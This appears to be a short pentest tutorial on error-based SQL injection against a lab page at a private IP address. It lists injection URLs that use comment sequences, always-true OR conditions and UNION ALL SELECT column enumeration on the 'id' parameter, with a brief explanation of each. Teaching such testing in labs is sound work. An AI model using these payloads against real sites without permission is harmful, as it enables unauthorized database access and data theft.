>

🧩 **The URLs and query strings provided** are examples of how the **id parameter** can be manipulated for **SQL injection testing** using special characters and logical conditions:

🔹 **Using `%23` or `#`** is a URL-encoded comment operator in SQL that ignores the rest of the query:

🌐 `http://192.168.1.31/web-pentest/error-based-string.php?id=1#`

🌐 `http://192.168.1.31/web-pentest/error-based-string.php?id=1%23`

🧱 These terminate the query early, allowing injection of payloads before the comment.

🔹 **Using logical operators** like `OR` and `AND` combined with single quotes attempts to alter query logic:

🌐 `http://192.168.1.31/web-pentest/error-based-string.php?id=1' or '1`

🌐 `http://192.168.1.31/web-pentest/error-based-string.php?id=1' or 1='1`

🧠 These try to make the **WHERE clause always true** to bypass filters or extract all rows.

🔹 **Using SQL comment sequences** to ignore trailing query parts:

🌐 `http://192.168.1.31/web-pentest/error-based-string.php?id=1' --+`

🌐 `http://192.168.1.31/web-pentest/error-based-string.php?id=1'%20--+`

💬 `--+` comments out the rest of the SQL query after the injected payload.

🧩 These techniques are **classic error-based SQL injection vectors** to test database query behavior and identify vulnerabilities by altering query logic or causing errors.

⚠️ Always ensure this testing is conducted in **legal and authorized environments only.**

### 🧩 Using UNION ALL SELECT for SQL Injection

The URLs provided demonstrate how to use the `UNION ALL SELECT` statement for SQL injection to run multiple select statements in one query via the **id** parameter.

🔹 The `UNION ALL` operator combines the results of two or more **SELECT** queries.

🔹 This technique lets attackers append a crafted **SELECT** statement to the original query to extract or manipulate data.

🔹 The number of columns in the **SELECT** after **UNION ALL** must match the number of columns in the original query.

---

### 🌐 Example URLs and Explanation

```
http://192.168.1.31/web-pentest/error-based-string.php?id=1' union all select 1,2,3,4,5,6,7 --+
http://192.168.1.31/web-pentest/error-based-string.php?id=1' union all select 1,2,3,4,5,6,7 --+
http://192.168.1.31/web-pentest/error-based-string.php?id=999999999' union all select 1,2,3,4,5,6,7 --+
http://192.168.1.31/web-pentest/error-based-string.php?id=admin' union all select 1,2,3,4,5,6,7 --+
http://192.168.1.31/web-pentest/error-based-string.php?id=1' union all select 100,200,3,4,5,6,7 --+

```

---

### ⚙️ How It Works

🔸 The **id** parameter injects a `UNION ALL SELECT` appended to the original query.

🔸 Each number (e.g., 1, 2, 3…) represents a column value in the injected result.

🔸 The web page response will reveal the number of columns, showing which injection succeeded.
